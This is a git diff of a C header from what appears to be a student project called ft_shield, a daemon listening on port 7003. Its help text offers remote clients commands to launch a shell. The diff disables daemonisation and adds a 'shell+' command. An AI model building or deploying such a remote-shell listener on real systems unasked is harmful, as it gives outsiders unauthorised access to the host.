@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 11:24:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/12/06 11:08:12 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/07 11:06:39 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -23,7 +23,7 @@
 # include <sys/file.h>
 # include <stdarg.h>
 
-# define DO_DAEMON 1
+# define DO_DAEMON 0
 
 # define SWORD_PORT	7003
 # ifndef SWORD_IP
@@ -46,7 +46,8 @@
 # define UNKNOWN_COMMAND_TEXT		TEXT_BLUE	TEXT_BOLD "Unknown command. (see help)\n"														TEXT_RESET
 
 # define HELP_TEXT					TEXT_BLUE	TEXT_BOLD \
-"shell: launch a shell\n\
+"shell+: launch a shell join it\n\
+shell: launch a shell for the next connection\n\
 quit: close ft_shield\n\
 help: see this\n\
 stats: see stats about the socket/users\n\
@@ -98,7 +99,7 @@ typedef struct s_ctx
 int	ctx_init(t_ctx *ctx);
 int	ctx_delete(t_ctx *ctx, bool log);
 
-void	message_hook(t_client *client, char *msg, int64_t size, void *ptr);
+int	message_hook(t_client *client, char *msg, int64_t size, void *ptr);
 void	connect_hook(t_client *client, void *ptr);
 void	disconnect_hook(t_client *client, void *ptr);
 void	handle_sig(int sig);
